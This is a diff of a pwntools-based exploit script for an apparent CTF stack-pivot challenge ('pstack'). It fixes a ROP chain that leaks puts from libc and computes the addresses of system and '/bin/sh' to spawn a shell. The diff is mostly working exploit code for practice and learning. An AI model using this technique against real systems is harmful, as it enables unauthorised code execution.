@@ -22,13 +22,11 @@ import os, sys
 # ---------------------------------------------------------------------------
 BIN_PATH   = './pstack'
 LIBC_PATH  = './libc.so.6'
-#BIN_PATH   = '/home/Axura/pwn/pwnkit/examples/stack-pivot/pstack/pstack'
-#LIBC_PATH  = '/home/Axura/pwn/pwnkit/examples/stack-pivot/pstack/libc.so.6'
 elf        = ELF(BIN_PATH, checksec=False)
 libc       = ELF(LIBC_PATH) if LIBC_PATH else None
 host, port = parse_argv(sys.argv[1:], None, None)
 
-ctx = Context(
+Context(
     arch      = 'amd64',
     os        = 'linux',
     endian    = 'little',
@@ -50,9 +48,6 @@ init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")
 # EXPLOIT
 # ---------------------------------------------------------------------------
 def xpl(**kwargs):
-   
-    # g("break *0x4006b8")
-
     elf_ggs = ROPGadgets(elf)
     p_rdi_r = elf_ggs['p_rdi_r']
     ret     = elf_ggs['ret']
@@ -77,7 +72,7 @@ def xpl(**kwargs):
     0x38: p64(read_bss)         # start from: text banner 0x4006b8
     }, filler=b'a')
     
-    sla(b'overflow?\n', pl)
+    sa(b'Can you grasp this little bit of overflow?', pl)
     
     # rsi=rbp-0x30=0x6018f8 (rbp=pivoted_stack)
     pl = flat({
@@ -90,7 +85,7 @@ def xpl(**kwargs):
     0x38: p64(read_bss-0x8+0x2b),   # 0x4006db
     }, filler=b'b')
             
-    sa(b'overflow\n', pl)
+    sa(b'Can you grasp this little bit of overflow?', pl)
     
     """
     1st leave: rsp pivot to 0x601938, rbp to 0x6018f8
@@ -98,12 +93,10 @@ def xpl(**kwargs):
     """
     
     r()
-    leak_puts = ru(b'\n')[:-1]
-    leak_puts = int.from_bytes(leak, byteorder="little")
+    leak_puts = uu64(ru(b'\n'))
     leak(leak_puts)
-    
     libc_base = leak_puts - libc.sym.puts
-    system = libc_base + libc.sym.systm
+    system = libc_base + libc.sym.system
     binsh  = libc_base + next(libc.search(b"/bin/sh\0"))
     leak(libc_base)
     leak(system)
